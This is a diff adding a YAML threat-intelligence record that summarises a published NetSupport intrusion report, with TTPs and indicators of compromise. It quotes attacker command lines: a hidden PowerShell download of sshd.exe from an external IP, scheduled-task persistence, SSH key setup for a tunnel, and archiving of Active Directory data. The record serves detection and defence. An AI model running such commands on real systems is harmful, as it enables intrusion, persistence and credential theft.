@@ -1,0 +1,71 @@
+description: The report details a cyber threat involving the use of NetSupport for
+  domain compromise, credential access, lateral movement, and command and control
+  activities.
+attribution:
+- NetSupport
+malware_families:
+- NetSupport
+TTPs:
+  processes:
+  - schtasks.exe
+  - cmd.exe
+  - powershell.exe
+  - sshd.exe
+  - ssh.exe
+  - 7z.exe
+  - cad.exe
+  - ntdsutil.exe
+  - procdump.exe
+  commandline:
+  - schtasks.exe /create /sc onlogon /tn "Wowsd Subsysten" /tr "C:\\Programdata\\sshd\\sshd.exe
+    -f C:\\Programdata\\sshd\\config\\sshd_config" /rl highest
+  - cmd.exe /c start "" "C:\\Program Files\\Windows NT\\Accessories\\WORDPAD.EXE"
+  - powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command
+    "Invoke-WebRequest -Uri http://185.206.146.129/sshd.exe -OutFile C:\\Programdata\\sshd\\sshd.exe"
+  - ssh-keygen -t rsa -f C:\\ProgramData\\sshd\\config\\id_rsa
+  - icacls C:\\ProgramData\\sshd\\config\\keys\\id_rsa /grant:r * (R)
+  - schtasks.exe /create /sc minute /mo 1 /tn "SSH Server" /rl highest /tr "-C:\\Programdata\\sshd\\sshd.exe
+    -f C:\\Programdata\\sshd\\config\\sshd_config"
+  - 7z.exe a c:\\Users\\Public\\ntds.7z "Active Directory"
+  powershell:
+  - powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command
+    "Invoke-WebRequest -Uri http://185.206.146.129/sshd.exe -OutFile C:\\Programdata\\sshd\\sshd.exe"
+  scripting_engine:
+  - powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command
+    "Invoke-WebRequest -Uri http://185.206.146.129/sshd.exe -OutFile C:\\Programdata\\sshd\\sshd.exe"
+  registry_keys:
+  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+  image_load:
+  - C:\Program Files\Windows NT\Accessories\WORDPAD.EXE
+  network_connections:
+  - schtasks.exe -> 185.206.146.129:2222
+  - sshd.exe -> 185.206.146.129:2222
+  - ssh.exe -> 185.206.146.129:2222
+  file_activity:
+  - C:\\Programdata\\sshd\\config\\id_rsa
+  - C:\\Users\\Public\\ntds.7z
+  - C:\\Program Files\\Windows NT\\Accessories\\WORDPAD.EXE
+  persistence:
+  - 'Scheduled Task: SSH Server'
+  - 'Scheduled Task: SSH Key Exchange'
+  pipes:
+  - ''
+  process_relations:
+  - schtasks.exe -> sshd.exe
+  - cmd.exe -> WORDPAD.EXE
+IOCs:
+  hashes:
+  - ''
+  IPs:
+  - 185.206.146.129
+  domains:
+  - 185.206.146.129
+  URLs:
+  - http://185.206.146.129/sshd.exe
+authors:
+- @iiamaleks
+- @MittenSec
+- @Miixxedup
+reference: https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/
+date_of_publication: October 30, 2023
+file_creation_date: July 28, 2025
